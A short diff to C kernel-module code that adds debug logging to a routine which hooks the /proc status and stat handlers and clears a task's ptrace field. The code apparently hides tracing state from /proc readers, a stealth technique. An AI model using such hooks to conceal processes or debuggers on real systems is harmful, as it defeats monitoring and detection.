@@ -18,6 +18,8 @@ proc_hide(struct proc_stash *s, struct task_struct *task)
 		return;
 	s->task = task;
 	s->ptrace = task->ptrace;
+	wr_dbg("proc hide pid=%d comm=%s ptrace=0x%lx by=%d\n",
+	       task_tgid_nr(task), task->comm, s->ptrace, task_tgid_nr(current));
 	task->ptrace = 0;
 }
 
@@ -65,6 +67,7 @@ proc_init(void)
 {
 	status_on = !hook_reg(&status_fp, "proc_pid_status");
 	stat_on = !hook_reg(&stat_fp, "proc_pid_stat");
+	wr_info("proc status=%d stat=%d\n", status_on, stat_on);
 	return 0;
 }
 
